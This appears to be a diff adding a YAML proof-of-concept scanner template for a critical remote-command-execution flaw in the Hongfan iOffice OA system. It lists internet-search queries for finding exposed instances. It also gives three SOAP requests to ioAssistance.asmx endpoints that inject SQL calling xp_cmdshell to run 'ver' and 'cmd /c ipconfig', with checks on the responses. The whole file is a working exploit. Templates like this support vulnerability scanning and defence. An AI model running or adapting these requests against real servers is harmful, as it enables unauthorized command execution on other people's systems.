@@ -1,0 +1,76 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="红帆-ioffice"
+    hunter-query: app.name=="红帆 iOffice"
+    quake-query: app:"ioffice红帆OA协同办公系统"  
+    zoomeye-query: app:"红帆 ioffice"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-hongfan-ioffice-ioAssistance.asmx-xp_cmd-rce
+manual: true
+transport: http
+set:
+    a: randomInt(1000000000, 9000000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /ioffice/prg/set/wss/ioAssistance.asmx
+            headers:
+              Content-Type: text/xml; charset=utf-8
+              Soapaction: http://tempuri.org/GetLoginedEmpNoReadedInf
+            body: |
+              <?xml version="1.0" encoding="utf-8"?>
+              <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+              <soap:Body>
+              <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+              <sql>exec master.dbo.xp_cmdshell 'ver'</sql>
+              </GetLoginedEmpNoReadedInf>
+              </soap:Body>
+              </soap:Envelope>
+        expression: response.status == 200 && response.body_string.contains("Windows")
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /ioffice/prg/set/wss/ioAssistance.asmx
+            headers:
+              Content-Type: text/xml; charset=utf-8
+              Soapaction: http://tempuri.org/GetLoginedEmpNoReadedInf
+            body: |
+              <?xml version="1.0" encoding="utf-8"?>
+              <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+              <soap:Body>
+              <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+              <sql>exec master.dbo.xp_cmdshell 'cmd /c ipconfig'</sql>
+              </GetLoginedEmpNoReadedInf>
+              </soap:Body>
+              </soap:Envelope>
+        expression: response.status == 200 && response.body_string.contains("IPv4")
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /ioffice/prg/set/wss/ioAssistance2.asmx
+            headers:
+              Content-Type: text/xml; charset=utf-8
+              Soapaction: http://tempuri.org/GetLoginedEmpNoReadedInf
+            body: |
+              <?xml version="1.0" encoding="utf-8"?>
+              <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+              <soap:Body>
+              <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+              <sql>exec master.dbo.xp_cmdshell 'ver'</sql>
+              </GetLoginedEmpNoReadedInf>
+              </soap:Body>
+              </soap:Envelope>
+        expression: response.status == 200 && response.body_string.contains("Windows")
+
+expression: r0() || r1() || r2()
